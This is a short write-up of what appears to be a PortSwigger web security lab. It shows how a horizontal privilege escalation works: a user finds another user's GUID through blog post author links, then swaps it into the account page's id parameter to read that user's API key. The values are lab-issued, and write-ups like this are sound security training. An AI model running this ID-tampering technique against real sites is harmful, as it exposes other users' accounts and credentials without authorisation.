## 4. User ID Controlled by Request Parameter (Unpredictable IDs)

**Objective:**  
Retrieve Carlos's API key.

**Credentials:**  
`wiener:peter`

**Steps:**

- Logged in as `wiener`.
- Observed own user ID (GUID format):

```bash
f2af5290-0a83-4d3b-9d5a-228295a19a67
```

- IDs are not predictable (not sequential like 1, 2, 3).

### Discovery Process:

- Browsed blog posts.
- Found posts with URLs like:

```bash
/post?postId=1
```

- Each post shows the author's username.
- Clicking username reveals their GUID.

- Iterated through posts to find Carlos's post:

```bash
/post?postId=3
```

- Clicked `carlos` → obtained his GUID:

```bash
affcb4f7-dd06-4ec3-8806-b8bc0fb70f91
```

### Exploit:

- Modified account URL:

```bash
/my-account?id=affcb4f7-dd06-4ec3-8806-b8bc0fb70f91
```

- Accessed Carlos's account.
- Retrieved API key:

```bash
hYMHMmfkO7lKWjereZ3nrWZRubAryfqe
```

**Conclusion:**

- This is a **Horizontal Privilege Escalation** vulnerability.
